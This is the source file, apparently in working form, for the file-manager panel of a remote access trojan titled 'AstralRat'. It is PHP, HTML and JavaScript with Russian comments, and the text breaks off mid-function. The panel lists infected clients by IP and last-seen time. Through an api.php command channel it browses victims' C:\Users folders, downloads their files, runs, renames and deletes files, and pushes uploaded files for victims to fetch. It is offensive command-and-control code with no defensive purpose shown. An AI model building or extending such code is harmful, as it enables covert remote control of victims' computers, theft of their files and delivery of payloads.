<?php
session_start();

// Путь к файлу данных
$dataFile = 'data.json';
if (file_exists($dataFile)) {
    $data = json_decode(file_get_contents($dataFile), true);
} else {
    $data = ['clients' => []];
}

// Устанавливаем client_id из GET-параметра
if (isset($_GET['client_id'])) {
    $_SESSION['client_id'] = trim($_GET['client_id']);
}
$client_id = $_SESSION['client_id'] ?? '';

// Обработка AJAX-запросов
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['ajax_action'])) {
    header('Content-Type: application/json');

    if (!$client_id) {
        echo json_encode(['status' => 'error', 'message' => 'Клиент не выбран!']);
        exit;
    }

    $ajax_action = $_POST['ajax_action'];

    if ($ajax_action == 'get_file_manager_data') {
        // Получаем данные файлового менеджера
        if (isset($data['clients'][$client_id]['fm_data']) && !empty($data['clients'][$client_id]['fm_data'])) {
            echo $data['clients'][$client_id]['fm_data'];
        } else {
            echo json_encode(['status' => 'empty', 'message' => 'Нет данных файлового менеджера']);
        }
        exit;
    }
    elseif ($ajax_action == 'send_command') {
        // Отправка команды клиенту
        $command = $_POST['command'] ?? '';

        if (empty($command)) {
            echo json_encode(['status' => 'error', 'message' => 'Пустая команда']);
            exit;
        }

        // Формирование запроса для API
        $postFields = [
            'action'    => 'set_command',
            'client_id' => $client_id,
            'command'   => $command
        ];

        // Генерируем URL для API
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
        $host = $_SERVER['HTTP_HOST'];
        $scriptDir = rtrim(dirname($_SERVER['REQUEST_URI']), '/\\');
        $apiUrl = "$protocol://$host$scriptDir/api.php";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $apiUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            error_log("cURL error: " . curl_error($ch));
            echo json_encode(['status' => 'error', 'message' => 'Ошибка cURL: ' . curl_error($ch)]);
        } else {
            $responseData = json_decode($response, true);
            if ($responseData && $responseData['status'] == 'ok') {
                echo json_encode(['status' => 'success', 'message' => 'Команда отправлена']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Ошибка отправки команды']);
            }
        }
        curl_close($ch);
        exit;
    }
    elseif ($ajax_action == 'upload_file') {
        // Загрузка файла на сервер
        if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
            $uploadDir = 'public_uploads';
            if (!is_dir($uploadDir)) {
                mkdir($uploadDir, 0777, true);
            }

            // Используем оригинальное имя файла
            $fileName = basename($_FILES['file']['name']);
            $serverFilePath = $uploadDir . '/' . $fileName;

            if (move_uploaded_file($_FILES['file']['tmp_name'], $serverFilePath)) {
                // Формируем публичный URL файла
                $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https" : "http";
                $host = $_SERVER['HTTP_HOST'];
                $scriptPath = rtrim(dirname($_SERVER['REQUEST_URI']), '/') . '/public_uploads/' . rawurlencode($fileName);
                $publicUrl = "$protocol://$host$scriptPath";

                // Отправляем команду клиенту для скачивания файла
                $command = "FM:download:$publicUrl";

                $postFields = [
                    'action'    => 'set_command',
                    'client_id' => $client_id,
                    'command'   => $command
                ];

                $apiUrl = "$protocol://$host$scriptDir/api.php";
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $apiUrl);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_exec($ch);
                curl_close($ch);

                echo json_encode(['status' => 'success', 'message' => 'Файл загружен и отправлен клиенту']);
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Ошибка загрузки файла']);
            }
        } else {
            echo json_encode(['status' => 'error', 'message' => 'Файл не загружен']);
        }
        exit;
    }
}

// В начале файла после session_start()
$toast = $_SESSION['toast'] ?? null;
unset($_SESSION['toast']);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=0.9">
    <title>AstralRat file-manager</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        body {
            background: #121212;
            color: #e6e4e1;
            overflow: hidden;
        }

        .header {
            padding: 1.1rem;
            text-align: left;
            background: #1e1e1e;
            border-bottom: 1px solid #121212;
        }

        .header h1 {
            font-size: 1.8rem;
            color: #e6e4e1;
            margin-bottom: 0.3rem;
        }

        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            color: #888;
            text-decoration: none;
            transition: all 0.3s ease;
            padding: 0.5rem 1rem;
            border-radius: 6px;
        }

        .back-link:hover {
            color: #576aed;
            background: rgba(87,106,237,0.1);
        }

        .container {
            display: flex;
            height: calc(100vh - 80px);
        }

        .sidebar {
            width: 250px;
            background: #121212;
            border-right: 1px solid #121212;
            padding: 1rem;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
        }

        .client-search {
            position: relative;
            margin-bottom: 1rem;
        }

        .client-search i {
            position: absolute;
            left: 10px;
            top: 50%;
            transform: translateY(-50%);
            color: #888;
        }

        .client-search input {
            width: 100%;
            padding: 0.6rem 0.75rem 0.6rem 2.5rem;
            background-color: #1e1e1e;
            border: 1px solid #121212;
            border-radius: 4px;
            color: #e6e4e1;
            font-size: 0.9rem;
        }

        .client-list {
            margin-top: 0.5rem;
            flex: 1;
            overflow-y: auto;
        }

        .client-card {
            background: #1e1e1e;
            padding: 0.8rem;
            border-radius: 6px;
            margin-bottom: 0.5rem;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 1px solid transparent;
        }

        .client-card:hover {
            background: #1e1e1e;
            border-color: #576aed;
        }

        .client-card.active {
            background: #1e1e1e;
            color: white;
            border: 2px solid #576aed;
            box-shadow: 0 0 10px rgba(87, 106, 237, 0.5);
        }

        .client-card.online::before {
            content: '';
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #4CAF50;
            border-radius: 50%;
            margin-right: 5px;
        }

        .client-card.offline::before {
            content: '';
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #f44336;
            border-radius: 50%;
            margin-right: 5px;
        }

        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .toolbar {
            padding: 0.8rem 1rem;
            background: #121212;
            border-bottom: 1px solid #121212;
            display: flex;
            gap: 0.5rem;
        }

        .toolbar-btn {
            background: #121212;
            border: none;
            color: #e6e4e1;
            padding: 0.5rem 1rem;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            transition: all 0.3s ease;
        }

        .toolbar-btn:hover {
            background: #3d3d3d;
        }

        .breadcrumb {
            padding: 0.8rem 1rem;
            background: #121212;
            border-bottom: 1px solid #121212;
            display: flex;
            align-items: center;
            gap: 0.5rem;
            flex-wrap: wrap;
        }

        .breadcrumb-item {
            color: #888;
            cursor: pointer;
            transition: all 0.3s ease;
            padding: 4px 8px;
            border-radius: 4px;
        }

        .breadcrumb-item:hover {
            color: #1e1e1e;
            background: rgba(87,106,237,0.1);
        }

        .breadcrumb-separator {
            color: #888;
            margin: 0 0.3rem;
        }

        .file-manager {
            flex: 1;
            overflow: auto;
            padding: 1rem;
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
        }

        .file-table th {
            text-align: left;
            padding: 0.8rem;
            background: #121212;
            position: sticky;
            top: 0;
            cursor: pointer;
        }

        .file-table th:hover {
            background: #3d3d3d;
        }

        .file-table td {
            padding: 0.8rem;
            border-bottom: 1px solid #121212;
        }

        .file-table tr:hover {
            background: #121212;
        }

        .file-icon {
            margin-right: 0.5rem;
            width: 20px;
            text-align: center;
        }

        .file-name {
            cursor: pointer;
        }

        .file-size, .file-modified {
            color: #888;
        }

        .context-menu {
            position: fixed;
            background: #121212;
            border-radius: 6px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
            z-index: 1000;
            display: none;
        }

        .context-menu-item {
            padding: 0.8rem 1.5rem;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .context-menu-item:hover {
            background: #121212;
        }

        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            display: none;
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #121212;
            border-top: 4px solid #576aed;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Для Webkit-браузеров (Chrome, Edge, Safari) */
        ::-webkit-scrollbar {
            width: 8px;
            border-radius: 8px;
        }

        ::-webkit-scrollbar-thumb {
            background: #444;
            border-radius: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #121212;
        }

        #toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .toast {
            position: relative;
            min-width: 250px;
            padding: 15px 20px;
            border-radius: 8px;
            color: white;
            font-family: Arial;
            opacity: 0;
            transform: translateX(100%);
            animation: slideIn 0.5s ease-out forwards,
                    fadeOut 0.5s ease-in 2.5s forwards;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .toast::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 0 0 8px 8px;
            animation: progress 3s linear forwards;
        }

        .toast i {
            font-size: 1.4rem;
            flex-shrink: 0;
        }

        .toast.success {
            background: #4CAF50;
        }

        .toast.error {
            background: #f44336;
        }

        .toast.info {
            background: #2196F3;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); opacity: 1; }
        }

        @keyframes fadeOut {
            from { transform: translateX(0); opacity: 1; }
            to { transform: translateX(100%); opacity: 0; }
        }

        @keyframes progress {
            from { width: 100%; }
            to { width: 0%; }
        }

        .upload-btn-wrapper {
            position: relative;
            overflow: hidden;
            display: inline-block;
        }

        .upload-btn-wrapper input[type=file] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        .path-input-container {
            display: flex;


            gap: 0.5rem;
        }

        .path-input {
            background: #121212;
            border: 1px solid #3d3d3d;
            color: #e6e4e1;
            padding: 0.5rem;
            border-radius: 4px;
            min-width: 150px;
        }

        .path-input-btn {
            background: #121212;
            border: none;
            color: #e6e4e1;
            padding: 0.5rem 1rem;
            border-radius: 4px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .path-input-btn:hover {
            background: #3d3d3d;
        }

        .selected {
            background-color: rgba(87, 106, 237, 0.2) !important;
        }
    </style>
</head>
<body>
    <header class="header">

        <a href="/" class="back-link">
            <i class="fa fa-arrow-left"></i>
            Назад
        </a>
    </header>

    <div class="container">
        <div class="sidebar">
            <h3>Клиенты</h3>
            <div class="client-search">
                <i class="fa fa-search"></i>
                <input type="text" id="client-search" placeholder="Поиск клиентов..." oninput="filterClients()">
            </div>
            <div class="client-list" id="client-list">
                <?php foreach($data['clients'] as $id => $client):
                    $isOnline = (time() - $client['last_seen']) < 300;
                    $isActive = $id === $client_id;
                ?>
                <div class="client-card <?= $isOnline ? 'online' : 'offline' ?> <?= $isActive ? 'active' : '' ?>"
                     onclick="selectClient('<?= $id ?>')"
                     data-client-id="<?= $id ?>"
                     data-client-ip="<?= $client['ip'] ?>">
                    <div style="font-weight: 600;"><?= htmlspecialchars($id) ?></div>
                    <div style="color: #888; font-size: 0.8rem;">IP: <?= $client['ip'] ?></div>
                    <div style="color: #888; font-size: 0.8rem;">
                        <i class="fa fa-clock"></i>
                        <?= date('d.m.Y H:i', $client['last_seen']) ?>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>

        <div class="main-content">
            <?php if ($client_id): ?>
            <div class="toolbar">
                <button class="toolbar-btn" onclick="refreshFileManager()">
                    <i class="fa fa-sync"></i> Обновить
                </button>
                <button class="toolbar-btn" onclick="goBack()">
                    <i class="fa fa-arrow-left"></i> Назад
                </button>
                <button class="toolbar-btn" onclick="goUp()">
                    <i class="fa fa-arrow-up"></i> Наверх
                </button>
                <div class="upload-btn-wrapper">
                    <button class="toolbar-btn">
                        <i class="fa fa-upload"></i> Загрузить
                    </button>
                    <input type="file" id="file-upload" onchange="handleFileUpload(this.files)">
                </div>
                <button class="toolbar-btn" onclick="createNewFolder()">
                    <i class="fa fa-folder-plus"></i> Новая папка
                </button>
                <div class="path-input-container">
    <input type="text" class="path-input" id="file-search" placeholder="Поиск файлов..." oninput="filterFiles()">
</div>
                <div class="path-input-container">
                    <input type="text" class="path-input" id="custom-path" placeholder="Введите путь">
                    <button class="path-input-btn" onclick="navigateToCustomPath()">
                        <i class="fa fa-arrow-right"></i>
                    </button>
                </div>
            </div>

            <div class="breadcrumb" id="breadcrumb">
                <div class="breadcrumb-item" onclick="navigateTo('C:\\Users')">
                    <i class="fa fa-home"></i> Главная
                </div>
            </div>

            <div class="file-manager">
                <table class="file-table">
                    <thead>
                        <tr>
                            <th onclick="sortTable('name')">Имя <i class="fa fa-sort"></i></th>
                            <th onclick="sortTable('size')">Размер <i class="fa fa-sort"></i></th>
                            <th onclick="sortTable('modified')">Изменен <i class="fa fa-sort"></i></th>
                        </tr>
                    </thead>
                    <tbody id="file-list">
                        <tr>
                            <td colspan="3" style="text-align: center; padding: 2rem;">
                                <i class="fa fa-spinner fa-spin"></i> Загрузка...
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <?php else: ?>
            <div style="display: flex; justify-content: center; align-items: center; height: 100%; flex-direction: column; gap: 1rem;">
                <i class="fa fa-folder-open" style="font-size: 3rem; color: #121212;"></i>
                <h2>Выберите клиента для управления файлами</h2>
                <p>Клиенты отображаются в левой панели</p>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <div class="context-menu" id="context-menu">
        <div class="context-menu-item" onclick="contextAction('open')"><i class="fa fa-folder-open"></i> Открыть</div>
        <div class="context-menu-item" onclick="contextAction('download')"><i class="fa fa-download"></i> Скачать</div>
        <div class="context-menu-item" onclick="contextAction('rename')"><i class="fa fa-edit"></i> Переименовать</div>
        <div class="context-menu-item" onclick="contextAction('delete')"><i class="fa fa-trash"></i> Удалить</div>
        <div class="context-menu-item" onclick="contextAction('properties')"><i class="fa fa-info-circle"></i> Свойства</div>
    </div>

    <div class="loading-overlay" id="loading-overlay">
        <div class="spinner"></div>
    </div>

    <div id="toast-container"></div>

    <script>
        // Функция для фильтрации клиентов
        function filterClients() {
            const searchText = document.getElementById('client-search').value.toLowerCase();
            const clientCards = document.querySelectorAll('.client-card');

            clientCards.forEach(card => {
                const clientId = card.getAttribute('data-client-id').toLowerCase();
                const clientIp = card.getAttribute('data-client-ip').toLowerCase();

                if (clientId.includes(searchText) || clientIp.includes(searchText)) {
                    card.style.display = 'block';
                } else {
                    card.style.display = 'none';
                }
            });
        }


        let currentClientId = '<?= $client_id ?>';
        let currentPath = 'C:\\Users';
        let currentSort = { column: 'name', direction: 'asc' };
        let selectedItem = null;
        let pathHistory = [];
        let currentHistoryIndex = -1;
        let fmRetryCount = 0;
        const fmMaxRetries = 1;
        let refreshInterval = null;
        let lastRequestedPath = '';
        // Загрузка файлового менеджера при выборе клиента
        if (currentClientId) {
            loadFileManager(currentPath, true);

        }

        function selectClient(clientId) {
            window.location.href = `?client_id=${clientId}`;
        }

        function loadFileManager(path, addToHistory = false) {
        document.getElementById('file-search').value = ''; // Сброс поиска
    showLoading();
    lastRequestedPath = path; // Сохраняем запрошенный путь

    // Добавляем путь в историю если нужно
    if (addToHistory) {
        // Если мы не в конце истории, удаляем все после текущего индекса
        if (currentHistoryIndex < pathHistory.length - 1) {
            pathHistory = pathHistory.slice(0, currentHistoryIndex + 1);
        }
        pathHistory.push(path);
        currentHistoryIndex = pathHistory.length - 1;
    }

    // Обновляем текущий путь
    currentPath = path;

    // Отправляем команду для получения списка файлов
    sendCommand('FM:list:' + path, function(response) {
        if (response.status === 'success') {
            // Ждем немного перед запросом данных
            setTimeout(fetchFileManagerData, 1500);
        } else {
            hideLoading();
            showToast('error', 'Ошибка отправки команды: ' + response.message);
        }
    });
}
function filterFiles() {
    const searchText = document.getElementById('file-search').value.toLowerCase();
    const rows = document.querySelectorAll('#file-list tr');

    rows.forEach(row => {
        const fileName = row.querySelector('.file-name').textContent.toLowerCase();
        if (fileName.includes(searchText)) {
            row.style.display = '';
        } else {
            row.style.display = 'none';
        }
    });
}
    function fetchFileManagerData() {
    const formData = new FormData();
    formData.append('ajax_action', 'get_file_manager_data');

    // Устанавливаем таймаут для запроса
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => reject(new Error('Таймаут запроса: сервер не ответил за 10 секунд')), 10000);
    });

    // Основной запрос
    const fetchPromise = fetch(window.location.href, {
        method: 'POST',
        body: formData
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    });

    // Обрабатываем с таймаутом
    Promise.race([fetchPromise, timeoutPromise])
    .then(data => {
        // Проверяем наличие данных
        if (!data) {
            throw new Error('Не удалось получить данные файлового менеджера');
        }

        // Проверяем наличие ошибок в выводе
        if (data.output) {
            // Ищем ошибки в разных форматах
            const errorPatterns = [
                /FM_ERROR:\s*(.*)/i,
                /EXCEPTION:\s*(.*)/i,
                /ERROR[:\s-]+\s*(.*)/i
            ];

            let errorFound = null;

            for (const pattern of errorPatterns) {
                const match = data.output.match(pattern);
                if (match) {
                    errorFound = match[1] || match[0];
                    break;
                }
            }

            if (errorFound) {
                throw new Error(`Ошибка файловой системы: ${errorFound}`);
            }
        }

        // Проверяем статус ответа
        if (data.status === 'error') {
            throw new Error(data.message || 'Произошла ошибка при выполнении команды');
        }

        // Проверяем, соответствует ли полученный путь запрошенному
        if (data.current_path && lastRequestedPath &&
            normalizePath(data.current_path) !== normalizePath(lastRequestedPath)) {
            // Пути не совпадают - возможно, ошибка доступа
            throw new Error(`Не удалось получить доступ к пути: ${lastRequestedPath}`);
        }

        // Проверяем, обновились ли файлы
        if (data.status === 'empty' || !data.files) {
            if (fmRetryCount < fmMaxRetries) {
                fmRetryCount++;
                showToast('info', `Ожидание данных...`);
                setTimeout(fetchFileManagerData, 3000);
                return; // Прерываем выполнение, будет повторная попытка
            } else {
                throw new Error('Не удалось загрузить данные после нескольких попыток. Файлы не обновились.');
            }
        }

        // Если данные получены успешно
        hideLoading();
        fmRetryCount = 0;
        currentPath = data.current_path;
        updateBreadcrumb(data.current_path);
        renderFileList(data.files);
        checkForExpectedFiles();
    })
    .catch(error => {
        hideLoading();
        console.error('Error:', error);

        // Определяем тип ошибки
        let errorMessage = 'Ошибка загрузки данных';

        if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
            errorMessage = 'Нет подключения к серверу. Проверьте соединение';
        } else if (error.message.includes('HTTP error')) {
            errorMessage = 'Ошибка сервера. Попробуйте позже';
        } else if (error.message.includes('Таймаут запроса')) {
            errorMessage = 'Сервер не отвечает. Возможно, клиент оффлайн';
        } else if (error.message.includes('Ошибка файловой системы')) {
            errorMessage = error.message;
        } else if (error.message.includes('Invalid argument')) {
            errorMessage = 'Неверный путь или параметр запроса';
        } else if (error.message.includes('Не удалось получить доступ')) {
            errorMessage = error.message;
        } else if (error.message.includes('Файлы не обновились')) {
            errorMessage = error.message;
        }

        showToast('error', errorMessage);

        // Сбрасываем счетчик попыток
        fmRetryCount = 0;
    });
}
// Вспомогательная функция для нормализации путей
function normalizePath(path) {
    if (!path) return '';
    // Приводим к нижнему регистру и удаляем конечные слеши
    return path.toLowerCase().replace(/[\\/]+$/, '');
}
function checkClientStatus(clientId) {
    return new Promise((resolve) => {
        const formData = new FormData();
        formData.append('ajax_action', 'check_client_status');
        formData.append('client_id', clientId);

        fetch(window.location.href, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            resolve(data.status === 'online');
        })
        .catch(error => {
            console.error('Error checking client status:', error);
            resolve(false);
        });
    });
}
        function checkForExpectedFiles() {
            // Здесь можно добавить логику проверки появления ожидаемых файлов
            // Например, если мы загрузили файл, мы можем проверить его наличие
            // Пока просто сбрасываем счетчик попыток
            fmRetryCount = 0;
        }

    function sendCommand(command, callback) {
    const formData = new FormData();
    formData.append('ajax_action', 'send_command');
    formData.append('command', command);

    fetch(window.location.href, {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        // Проверяем наличие ошибок в выводе
        if (data.output) {
            const errorPatterns = [
                /FM_ERROR:\s*(.*)/i,
                /EXCEPTION:\s*(.*)/i,
                /ERROR[:\s-]+\s*(.*)/i
            ];

            for (const pattern of errorPatterns) {
                const match = data.output.match(pattern);
                if (match) {
                    const errorText = match[1] || match[0];
                    showToast('error', `Ошибка выполнения команды: ${errorText}`);
                    if (callback) callback({status: 'error', message: errorText});
                    return;
                }
            }
        }

        if (callback) callback(data);
    })
    .catch(error => {
        console.error('Error:', error);
        showToast('error', 'Ошибка отправки команды');
        if (callback) callback({status: 'error', message: 'Network error'});
    });
}

        function updateBreadcrumb(path) {
    const breadcrumb = document.getElementById('breadcrumb');
    breadcrumb.innerHTML = '';

    // Определяем корневой диск из пути
    const rootDrive = path.substring(0, 2) + '\\';

    // Добавляем домашнюю ссылку
    const homeItem = document.createElement('div');
    homeItem.className = 'breadcrumb-item';
    homeItem.innerHTML = '<i class="fa fa-home"></i> Главная';
    homeItem.onclick = () => navigateTo(rootDrive);
    breadcrumb.appendChild(homeItem);

    if (path && path !== rootDrive) {
        const parts = path.split('\\').filter(part => part !== '');
        let currentPath = rootDrive;

        for (let i = 0; i < parts.length; i++) {
            const part = parts[i];

            // Пропускаем пустые части и корневой диск
            if (!part || part === rootDrive.substring(0, 2)) continue;

            const separator = document.createElement('div');
            separator.className = 'breadcrumb-separator';
            separator.innerHTML = '<i class="fa fa-chevron-right"></i>';
            breadcrumb.appendChild(separator);

            currentPath += part + '\\';
            const fullPath = currentPath;

            const item = document.createElement('div');
            item.className = 'breadcrumb-item';
            item.textContent = part;
            item.onclick = () => navigateTo(fullPath);
            breadcrumb.appendChild(item);
        }
    }
}

        function navigateTo(path) {
    // Нормализуем путь - убеждаемся, что он заканчивается обратным слешем
    let normalizedPath = path;
    if (!normalizedPath.endsWith('\\')) {
        normalizedPath += '\\';
    }

    // Если путь содержит ">", заменяем на "\"
    if (normalizedPath.includes('>')) {
        normalizedPath = normalizedPath.replace(/>/g, '\\');
    }

    loadFileManager(normalizedPath, true);
}

        function goBack() {
            if (currentHistoryIndex > 0) {
                currentHistoryIndex--;
                const previousPath = pathHistory[currentHistoryIndex];
                loadFileManager(previousPath, false);
            } else {
                showToast('info', 'Вы в начале истории навигации');
            }
        }

        function goUp() {
            if (currentPath && currentPath !== 'C:\\') {
                const parts = currentPath.split('\\').filter(part => part !== '');
                parts.pop(); // Удаляем последнюю часть пути

                let parentPath = parts.join('\\');
                if (!parentPath.endsWith('\\') && parentPath !== 'C:') {
                    parentPath += '\\';
                }

                if (parentPath === 'C:') parentPath = 'C:\\Us';

                loadFileManager(parentPath, true);
            }
        }

        function navigateToCustomPath() {
            const customPath = document.getElementById('custom-path').value;
            if (customPath) {
                // Нормализуем путь - добавляем обратные слеши в конце если нужно
                let normalizedPath = customPath;
                if (!normalizedPath.endsWith('\\')) {
                    normalizedPath += '\\';
                }
                loadFileManager(normalizedPath, true);
            }
        }

        function renderFileList(files) {
            const fileList = document.getElementById('file-list');
            fileList.innerHTML = '';
            if (document.getElementById('file-search').value) {
        filterFiles();
    }
            if (!files || files.length === 0) {
                fileList.innerHTML = `
                    <tr>
                        <td colspan="3" style="text-align: center; padding: 2rem;">
                            Папка пуста
                        </td>
                    </tr>
                `;
                return;
            }

            // Сортируем файлы
            files.sort((a, b) => {
                // Сначала папки, потом файлы
                if (a.type !== b.type) {
                    return a.type === 'directory' ? -1 : 1;
                }

                let valueA, valueB;
                switch (currentSort.column) {
                    case 'name':
                        valueA = a.name.toLowerCase();
                        valueB = b.name.toLowerCase();
                        break;
                    case 'size':
                        valueA = a.size;
                        valueB = b.size;
                        break;
                    case 'modified':
                        valueA = new Date(a.modified);
                        valueB = new Date(b.modified);
                        break;
                    default:
                        valueA = a.name.toLowerCase();
                        valueB = b.name.toLowerCase();
                }

                if (valueA < valueB) return currentSort.direction === 'asc' ? -1 : 1;
                if (valueA > valueB) return currentSort.direction === 'asc' ? 1 : -1;
                return 0;
            });

            files.forEach(file => {
                const row = document.createElement('tr');

                // Определяем иконку в зависимости от типа файла
                let icon = 'fa-file';
                if (file.type === 'directory') {
                    icon = 'fa-folder';
                } else {
                    const ext = file.name.split('.').pop().toLowerCase();
                    if (['jpg', 'jpeg', 'png', 'gif', 'bmp'].includes(ext)) icon = 'fa-file-image';
                    else if (['pdf'].includes(ext)) icon = 'fa-file-pdf';
                    else if (['doc', 'docx'].includes(ext)) icon = 'fa-file-word';
                    else if (['xls', 'xlsx'].includes(ext)) icon = 'fa-file-excel';
                    else if (['mp3', 'wav', 'ogg'].includes(ext)) icon = 'fa-file-audio';
                    else if (['mp4', 'avi', 'mov', 'wmv'].includes(ext)) icon = 'fa-file-video';
                    else if (['zip', 'rar', '7z'].includes(ext)) icon = 'fa-file-archive';
                }

                // Форматируем размер файла
                let sizeFormatted = '-';
                if (file.type === 'file' && file.size) {
                    if (file.size < 1024) {
                        sizeFormatted = file.size + ' B';
                    } else if (file.size < 1024 * 1024) {
                        sizeFormatted = (file.size / 1024).toFixed(2) + ' KB';
                    } else if (file.size < 1024 * 1024 * 1024) {
                        sizeFormatted = (file.size / (1024 * 1024)).toFixed(2) + ' MB';
                    } else {
                        sizeFormatted = (file.size / (1024 * 1024 * 1024)).toFixed(2) + ' GB';
                    }
                }

                row.innerHTML = `
                    <td>
                        <i class="fa ${icon} file-icon"></i>
                        <span class="file-name">${file.name}</span>
                    </td>
                    <td class="file-size">${sizeFormatted}</td>
                    <td class="file-modified">${file.modified}</td>
                `;

                // Обработчики событий
                row.onclick = (e) => {
                    if (file.type === 'directory') {
                        // Исправление: используем полный путь из данных
                        loadFileManager(file.path, true);
                    } else {
                        selectFile(file, e);
                    }
                };

                row.oncontextmenu = (e) => {
                    selectFile(file, e);
                    showContextMenu(e);
                    return false; // Предотвращаем стандартное контекстное меню
                };

                fileList.appendChild(row);
            });
        }

        function selectFile(file, event) {
            selectedItem = file;

            // Убираем выделение с других строк
            document.querySelectorAll('#file-list tr').forEach(row => {
                row.classList.remove('selected');
            });

            // Добавляем выделение к текущей строке
            if (event && event.currentTarget) {
                event.currentTarget.classList.add('selected');
            }
        }

        function showContextMenu(event) {
            const contextMenu = document.getElementById('context-menu');
            contextMenu.style.display = 'block';
            contextMenu.style.left = event.pageX + 'px';
            contextMenu.style.top = event.pageY + 'px';

            // Скрываем контекстное меню при клике вне его
            document.addEventListener('click', hideContextMenu);
        }

        function hideContextMenu() {
            const contextMenu = document.getElementById('context-menu');
            contextMenu.style.display = 'none';
            document.removeEventListener('click', hideContextMenu);
        }

        function contextAction(action) {
            if (!selectedItem) return;

            hideContextMenu();

            switch (action) {
                case 'open':
                    if (selectedItem.type === 'directory') {
                        loadFileManager(selectedItem.path, true);
                    } else {
                        sendCommand('FM:execute:' + selectedItem.path, function(response) {
                            if (response.status === 'success') {
                                showToast('success', 'Файл запущен');
                            } else {
                                showToast('error', 'Ошибка запуска файла: ' + response.message);
                            }
                        });
                    }
                    break;
                case 'download':
                    sendCommand('FM:download:' + selectedItem.path, function(response) {
                        if (response.status === 'success') {
                            showToast('success', 'Файл отправлен на скачивание');
                        } else {
                            showToast('error', 'Ошибка скачивания: ' + response.message);
                        }
                    });
                    break;
                case 'rename':
                    const newName = prompt('Введите новое имя:', selectedItem.name);
                    if (newName && newName !== selectedItem.name) {
                        const newPath = selectedItem.path.replace(selectedItem.name, newName);
                        sendCommand('FM:rename:' + selectedItem.path + ':' + newPath, function(response) {
                            if (response.status === 'success') {
                                showToast('success', 'Файл переименован');
                                // Обновляем через 2 секунды
                                setTimeout(refreshFileManager, 2000);
                            } else {
                                showToast('error', 'Ошибка переименования: ' + response.message);
                            }
                        });
                    }
                    break;
                case 'delete':
                    if (confirm(`Удалить "${selectedItem.name}"?`)) {
                        sendCommand('FM:delete:' + selectedItem.path, function(response) {
                            if (response.status === 'success') {
                                showToast('success', 'Файл удален');
                                // Обновляем через 2 секунды
                                setTimeout(refreshFileManager, 2000);
                            } else {
                                showToast('error', 'Ошибка удаления: ' + response.message);
                            }
                        });
                    }
                    break;
                case 'properties':
                    alert(`Свойства: ${selectedItem.name}\nТип: ${selectedItem.type}\nРазмер: ${selectedItem.size} байт\nИзменен: ${selectedItem.modified}`);
                    break;
            }
        }

        function sortTable(column) {
            if (currentSort.column === column) {
                currentSort.direction = currentSort.direction === 'asc' ? 'desc' : 'asc';
            } else {
                currentSort.column = column;
                currentSort.direction = 'asc';
            }

            // Перерисовываем таблицу
            fetchFileManagerData();
        }

        function refreshFileManager() {
            loadFileManager(currentPath, false);
        }

        function handleFileUpload(files) {
            if (!files.length) return;

            const formData = new FormData();
            formData.append('ajax_action', 'upload_file');
            formData.append('file', files[0]);

            showLoading();

            fetch(window.location.href, {
                method: 'POST',
                body: formData
            })
